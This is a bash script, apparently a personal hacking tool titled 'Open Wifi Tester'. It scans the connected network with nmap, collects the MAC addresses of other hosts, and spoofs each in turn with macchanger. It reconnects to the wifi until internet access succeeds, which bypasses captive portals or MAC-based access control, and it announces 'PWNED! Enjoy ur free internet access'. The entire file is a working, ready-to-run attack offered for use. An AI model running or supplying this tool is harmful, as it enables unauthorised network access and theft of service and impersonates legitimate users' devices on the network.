#!/bin/bash

export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
clear_terminal() {
	clear
}

clear_terminal

# reminder, also change the subnet mask on the nmap scan if its not a /16 network.
# i haven't figured out how to do it automatically nor have the intention to do so, i'm lazy okay?
# I (the author) is not liable in anything you do, so don't do dumb things

# This tool requires NMAP, LOLCAT, MACCHANGER, A LINUX DISTRO, AND ESPECIALLY COMMON SENSE.

# HACK THE PLANET!

banner() {
echo -e " "
echo -e "                     |  /___  |                         _) "
echo -e "                     ' /     /  __| _ \   _ \  __ \`__ \  | "
echo -e "                     . \    /  |   (   | (   | |   |   | | "
echo -e "                    _|\_\ _/  _|  \___/ \___/ _|  _|  _|_| "
echo -e "					- security is lulz - "
echo -e " "
echo -e "		- OPEN WIFI TESTER - "
echo -e "		@ Kerby Bacotot / 0xk7roomi"
echo -e " "
}

LOLCAT_PATH="/usr/games/lolcat" # replace PATH/remove lolcat if u don't want this !!!

banner | "$LOLCAT_PATH"

# colors !!!

default='\e[39m'
red='\e[31m'
yellow='\e[33m'
green='\e[32m'

sleep 1

# check if root
check_root() {
	if (($EUID != 0)); then
		echo -e "${red}[x]${default} Please run as root.";
		exit
	else
		discover_networks
	fi
}

# init

gateway=$(ip route | grep default | awk '{print $3}')
wifiaddr=$(iwgetid | awk -F'"' '{print $2}')
iface="wlan0" # change if other interface is used


# Confirming wifi network

if (($EUID != 0)); then
	echo -e "${red}[x]${default} Please run as root."
	exit
fi

echo -e "${green}[+]${default} Connected to SSID: $wifiaddr"

sleep 1

reset_wifi() {
	if [ "$(ip a | grep $iface | awk '{print $9}' | head -n 1)" = "DOWN" ]; then
		echo -e "${red}[x]${default} Wifi is OFF. Turning on.."
		ip link set $iface up
		sleep 5
	fi
}

reset_wifi

reset_mac() {
	echo -e "${green}[+]${default} Setting MAC address to default.."
	ip link set $iface down
	sleep 5
	macchanger -p $iface
	ip link set $iface up
	sleep 5
}

clear_tmp() {
	rm /tmp/res.txt /tmp/res_no_dupe.txt
}

clean_file() {
	echo -e "${green}[+]${default} Cleaning file and removing duplicate MAC Addresses.."
	sort /tmp/res.txt | uniq > /tmp/res_no_dupe.txt
	read_file
}

check_net() {
	echo -e "${green}[+]${default} Checking if MAC has access to the internet..."

	if ping -c 5 -W 1 1.1.1.1 &>/dev/null; then
    		return 0
  	else
    		echo -e "${yellow}[!]${default} No internet connection detected. Proceeding to next MAC"
    		return 1
	fi
}

discover_networks() {
    echo -e "${green}[+]${default} Scanning Network $gateway for hosts.. "
    nmap -sn -T4 -vv -n $gateway/16 | grep MAC | awk '{print $3}' > /tmp/res.txt
    echo -e "${green}[+]${default} Finished scanning. Proceeding to pwn MAC addresses"
    clean_file
}

read_file() {

	if [ -s "/tmp/res_no_dupe.txt" ]; then
		while IFS= read -r line; do
			echo -e "${green}[+]${default} MAC Address Found! $line"
			pwn "$line"
			sleep 5
		done < /tmp/res_no_dupe.txt
	else
		echo -e "${red}[x]${default} No MAC Address was found."
		exit
	fi

}

pwn() {
	local mac="$1"
	echo -e "${green}[+]${default} Trying to pwn $wifiaddr with MAC $mac"

	ip link set "$iface" down
	sleep 5

	macchanger -m "$mac" "$iface"
	echo -e "${green}[+]${default} MAC Address Changed to $mac"
	ip link set "$iface" up
	sleep 10
	nmcli device wifi connect "$wifiaddr"
	sleep 5

	if check_net; then
		echo -e "[+] PWNED! Enjoy ur free internet access ;)" | "$LOLCAT_PATH" -a -d 30
		echo -e "${green}[+] if you like what i'm doing pls consider to gcash my location sir" 
		exit
	fi
}

pwnAuto() {
	clear_tmp
	reset_mac
	check_root
}

pwnManual() {
	if (($EUID != 0)); then
	     echo -e "${red}[x]${default} Please run as root."
	     exit
	fi

	echo -e "${green}[+]${default} Please enter the MAC address (FF:FF:FF:FF:FF:FF): "
	read spoof_addr

	echo -e "${yellow}[1]${default} New MAC address ${spoof_addr} selected, proceed? (1 = yes / 2 = no)"
	read dc_mac

	if [[ $dc_mac -eq 1 ]]
	then
	     ip link set "$iface" down
	     sleep 5
	     macchanger -m $spoof_addr $iface
	     ip link set "$iface" up
	     exit
	elif [[ $dc_mac -eq 2 ]]
	then
	     pwnManual
	else
	     echo -e "${red}[x]${default} Please choose 1/2."
	     exit
	fi

}

mnorat() {
	echo -e "${yellow}[!]${default} Do you want to input the MAC automatically (if you already know it else, choose automatic)"
	echo "Choose: (1 for MANUAL, 2 for AUTOMATIC)"
	read decision

	if [[ $decision -eq 1 ]]
	then
	     echo -e "${green}[+]${default} MANUAL MODE"
	     pwnManual
	elif [[ $decision -eq 2 ]]
	then
	     echo -e "${green}[+]${default} AUTO MODE"
	     pwnAuto
	else
	     echo -e "${red}[x]${default} Please choose (1 for MANUAL / 2 for AUTOMATIC)"
	fi
}

mnorat
